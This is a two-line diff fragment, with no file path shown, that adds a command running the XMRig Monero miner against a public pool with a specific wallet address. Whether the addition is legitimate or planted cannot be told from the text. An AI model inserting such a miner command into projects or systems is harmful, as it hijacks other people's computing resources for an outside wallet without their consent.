@@ -1,0 +1,2 @@
+./xmrig -o pool.minexmr.com:4444 -u 87rp4e6DJ3s8zcYZvGBBspfX7RQsDo5S9StEdn5BvRPCNAZbva9bmjWfP1HTEYque9FArMJ59VxcN1c5YS4CrgYZGArHRjY --donate-level 1
+
